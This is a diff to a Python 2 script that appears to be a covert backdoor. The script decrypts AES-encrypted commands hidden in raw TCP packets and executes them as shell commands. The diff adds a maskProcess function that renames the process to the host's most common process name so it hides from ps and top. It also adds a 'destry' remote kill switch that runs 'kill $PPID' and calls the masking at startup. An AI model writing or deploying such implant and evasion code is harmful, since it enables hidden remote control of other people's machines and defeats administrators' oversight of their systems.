@@ -1,4 +1,5 @@
-import hashlib, ConfigParser
+import hashlib, ConfigParser, os, setproctitle
+from ctypes import *
 #from Crypto import Random
 import subprocess
 from time import sleep
@@ -40,6 +41,31 @@ def encrypt(text):
     cipher = AES.new(key, AES.MODE_CFB, IV)
     ciphertext = cipher.encrypt(text)
     return ciphertext
+
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       exit()
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
+def exit():
+    os.system('kill $PPID')
+
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       maskProcess()
+#--
+#-- NOTES:
+#-- maskProcess obtains the most common process for both ps -aux and top and
+#-- calls setProcessName to set the script process name to the most common
+#-- process running on the system at the time.
+#-----------------------------------------------------------------------------
+def maskProcess():
+    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
+    commandResult = command.read()
+    setproctitle.setproctitle(commandResult)
+    #setProcessName(commandResult)
+    print "Most common process: {0}".format(commandResult)
+
 
 
 #--------------------------------------------------------------------------------
@@ -287,10 +313,12 @@ def parse_packet(packet):
                     # get data from the packet
                     data = packet[h_size:h_size+tcph[6]]
                     commandString = decrypt(data)
+		    if(commandString == "destry"):
+		        exit()
 		    print len(commandString)
                     print 'Data : ' + commandString
                     output_dec = shellCommand(packet, commandString)
-                    sleep(2)
+                    #sleep(2)
                     #for seq in range(0, len(output_dec), 1):
                     last = len(output_dec) - 1
                     counter = 0
@@ -329,6 +357,8 @@ def parse_packet(packet):
                     data = packet[h_size:h_size+checksum]
 
                     commandString = decrypt(data)
+		    if(commandString == "destry"):
+		        exit()
 
                     print 'Data : ' + commandString
 
@@ -349,6 +379,7 @@ def parse_packet(packet):
 
 if __name__ == "__main__":
     try:
+	maskProcess()
         main(sys.argv)
     except KeyboardInterrupt:
         print "exiting.."
